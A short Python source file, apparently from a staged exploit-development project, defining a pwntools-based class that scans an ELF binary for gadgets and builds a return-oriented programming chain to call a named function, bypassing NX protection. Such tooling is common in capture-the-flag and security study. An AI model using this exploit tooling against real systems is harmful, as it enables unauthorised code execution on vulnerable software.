from pwn import *

class ROPSynthesizer:
    """
    Sprint 10: Automated ROP Chain Generator.
    Bypasses NX (No-Execute) protection by chaining existing code gadgets.
    """
    def __init__(self, binary_path: str):
        self.binary_path = binary_path
        # Load binary context
        self.elf = ELF(binary_path, checksec=False)
        # CRITICAL FIX: Force Pwntools to use the binary's arch (64-bit)
        context.binary = self.elf
        self.rop = ROP(self.elf)

    def find_gadgets(self):
        """
        Scans the binary for 'pop rdi; ret', 'pop rsi; ret', etc.
        """
        print(f"[ROP] Scanning {self.binary_path} for gadgets...")
        # Pwntools automatically finds gadgets on initialization
        print(f"[ROP] Gadgets found: {len(self.rop.gadgets)}")
        
    def build_exec_chain(self, target_func_name: str) -> bytes:
        """
        Constructs a chain to call a specific function.
        Logic: 
        1. Find address of target function.
        2. Stack padding.
        3. Jump to target.
        """
        try:
            # Clear previous chains
            self.rop = ROP(self.elf)
            
            # Simple ROP: Just jump to the function (Similar to Sprint 9 but using ROP structure)
            # In a complex scenario, we would chain: pop rdi -> arg1 -> call system
            self.rop.call(target_func_name)
            
            chain = self.rop.chain()
            print(f"[ROP] Chain generated! Length: {len(chain)} bytes")
            print(f"[ROP] Structure:\n{self.rop.dump()}")
            return chain
            
        except Exception as e:
            print(f"[ROP] Failed to synthesize chain: {e}")
            return b""